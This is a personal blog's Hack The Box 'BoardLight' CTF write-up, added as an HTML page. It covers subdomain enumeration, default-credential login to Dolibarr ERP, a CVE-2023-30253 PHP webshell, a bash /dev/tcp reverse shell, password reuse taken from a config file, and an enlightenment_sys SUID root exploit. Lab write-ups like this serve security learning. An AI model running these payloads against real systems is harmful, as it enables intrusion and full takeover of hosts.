@@ -1,0 +1,435 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://hansmolemanpng.github.io/blog/htb-boardlight/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/profile.jpeg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.4">
+    
+    
+      
+        <title>HTB BoardLight — Writeup - Hans_Moleman.PNG</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#htb-boardlight-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Hans_Moleman.PNG" class="md-nav__button md-logo" aria-label="Hans_Moleman.PNG" data-md-component="logo">
+      
+  <img src="../../assets/profile.jpeg" alt="logo">
+
+    </a>
+    Hans_Moleman.PNG
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recon
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access-dolibarr-erp-cve-2023-30253" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Access — Dolibarr ERP (CVE-2023-30253)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Movement — User
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-enlightenment_sys-suid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation — enlightenment_sys SUID
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+<div class="layout">
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <div class="profile">
+        <img class="avatar" src="../../assets/profile.jpeg" alt="profile">
+        <div class="name">Hans_Moleman.PNG</div>
+        <div class="bio">AppSec · Web Security · Vulnerability Research</div>
+      </div>
+
+      <div class="social-row">
+        <a class="iconbtn" href="https://x.com/HansMolemanPNG" target="_blank" rel="noopener" aria-label="X">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18.9 2H22l-6.8 7.8L23 22h-6.2l-4.9-6.4L6.3 22H3.2l7.3-8.4L1 2h6.3l4.4 5.8L18.9 2zm-1.1 18h1.7L7.4 3.9H5.6L17.8 20z"/></svg>
+        </a>
+
+        <a class="iconbtn" href="https://github.com/HansMolemanPNG" target="_blank" rel="noopener" aria-label="GitHub">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0 1 12 6.844a9.59 9.59 0 0 1 2.504.337c1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0 0 22 12.017C22 6.484 17.522 2 12 2z"/></svg>
+        </a>
+
+        <a class="iconbtn" href="mailto:alsamapa@gmail.com" aria-label="Email">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 4-8 5L4 8V6l8 5 8-5v2z"/></svg>
+        </a>
+      </div>
+
+      <div class="sidebar-divider"></div>
+
+      <div class="navlinks">
+        <a class="navbtn active" href="../../index.html">Blog</a>
+        <a class="navbtn" href="../../about/">About</a>
+      </div>
+
+    </div>
+  </aside>
+
+  <main class="main main--article">
+    
+    <a class="back-link" href="../..">← Blog</a>
+    
+    <div class="article-meta-header"><span class="post-badge post-badge--writeup">Writeup</span><span class="article-date">2026-03-06</span></div>
+<h1 id="htb-boardlight-writeup">HTB BoardLight — Writeup<a class="headerlink" href="#htb-boardlight-writeup" title="Permanent link">&para;</a></h1>
+<p><strong>Difficulty:</strong> Easy
+<strong>OS:</strong> Linux
+<strong>Release:</strong> 2024-05-11</p>
+<hr />
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<p>Start with a port scan:</p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-oN<span class="w"> </span>nmap/initial<span class="w"> </span><span class="m">10</span>.10.11.11
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>22/tcp   open  ssh     OpenSSH 8.2p1
+80/tcp   open  http    Apache httpd 2.4.41
+</code></pre></div>
+<p>The web server at port 80 shows a corporate landing page for "BoardLight". Nothing interesting in the visible content, but subdomain enumeration finds something:</p>
+<div class="highlight"><pre><span></span><code>ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-u<span class="w"> </span>http://board.htb/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ.board.htb&quot;</span><span class="w"> </span>-fs<span class="w"> </span><span class="m">15949</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>crm     [Status: 200, Size: 6360]
+</code></pre></div>
+<hr />
+<h2 id="initial-access-dolibarr-erp-cve-2023-30253">Initial Access — Dolibarr ERP (CVE-2023-30253)<a class="headerlink" href="#initial-access-dolibarr-erp-cve-2023-30253" title="Permanent link">&para;</a></h2>
+<p>The subdomain <code>crm.board.htb</code> runs <strong>Dolibarr ERP 17.0.0</strong>. Default credentials work:</p>
+<div class="highlight"><pre><span></span><code>admin:admin
+</code></pre></div>
+<p>Dolibarr 17.0.0 is vulnerable to <strong>CVE-2023-30253</strong>, a PHP code injection via the website module. The CMS page editor allows creating <code>.php</code> files but tries to block <code>&lt;?php</code> tags. The bypass is trivial — use <code>&lt;?PHP</code> (uppercase):</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?PHP</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+<p>Create a new website, add a page, inject the payload in the page template, then request it:</p>
+<div class="highlight"><pre><span></span><code>http://crm.board.htb/htdocs/public/website/index.php?website=test&amp;pageref=shell&amp;cmd=id
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div>
+<p>Upgrade to a reverse shell:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Listener</span>
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+
+<span class="c1"># Payload (URL encoded)</span>
+bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.X/4444 0&gt;&amp;1&#39;</span>
+</code></pre></div>
+<hr />
+<h2 id="lateral-movement-user">Lateral Movement — User<a class="headerlink" href="#lateral-movement-user" title="Permanent link">&para;</a></h2>
+<p>Enumerate the Dolibarr config:</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/var/www/html/crm.board.htb/htdocs/conf/conf.php
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="x">$dolibarr_main_db_pass=&#39;ServicesHubADM!&#39;;</span>
+</code></pre></div>
+<p>Try the password for the local users:</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>nologin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="nb">false</span>
+<span class="c1"># larissa:x:1000:1000::/home/larissa:/bin/bash</span>
+
+su<span class="w"> </span>-<span class="w"> </span>larissa<span class="w">   </span><span class="c1"># password: ServicesHubADM!</span>
+</code></pre></div>
+<p>Grab <code>user.txt</code>.</p>
+<hr />
+<h2 id="privilege-escalation-enlightenment_sys-suid">Privilege Escalation — enlightenment_sys SUID<a class="headerlink" href="#privilege-escalation-enlightenment_sys-suid" title="Permanent link">&para;</a></h2>
+<p>Look for SUID binaries:</p>
+<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+</code></pre></div>
+<p>The installed version of the <code>enlightenment</code> window manager is vulnerable to a local privilege escalation via <code>enlightenment_sys</code>. The binary takes a path argument and passes it to <code>mount</code> as root without proper sanitization.</p>
+<div class="highlight"><pre><span></span><code>/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>/bin/mount<span class="w"> </span>-o<span class="w"> </span>noexec,nosuid,utf8,nodev,iocharset<span class="o">=</span>utf8,utf8<span class="o">=</span><span class="m">0</span>,utf8<span class="o">=</span><span class="m">1</span>,uid<span class="o">=</span><span class="k">$(</span>id<span class="w"> </span>-u<span class="k">)</span>,<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;/dev/../tmp/;/tmp/exploit&quot;</span>
+</code></pre></div>
+<p>Where <code>/tmp/exploit</code> is:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+chmod<span class="w"> </span>+s<span class="w"> </span>/bin/bash
+</code></pre></div>
+<p>After execution:</p>
+<div class="highlight"><pre><span></span><code>/bin/bash<span class="w"> </span>-p
+<span class="c1"># bash-5.0# id</span>
+<span class="c1"># uid=1000(larissa) gid=1000(larissa) euid=0(root) egid=0(root)</span>
+</code></pre></div>
+<p>Grab <code>root.txt</code>.</p>
+<hr />
+<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Recon</td>
+<td>Subdomain enumeration → <code>crm.board.htb</code></td>
+</tr>
+<tr>
+<td>Initial access</td>
+<td>Dolibarr default creds + CVE-2023-30253 PHP injection</td>
+</tr>
+<tr>
+<td>Lateral movement</td>
+<td>Password reuse from Dolibarr config</td>
+</tr>
+<tr>
+<td>Privesc</td>
+<td>Vulnerable SUID <code>enlightenment_sys</code> binary</td>
+</tr>
+</tbody>
+</table>
+  </main>
+
+</div>
+
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../assets/extra.js"></script>
+      
+    
+  </body>
+</html>
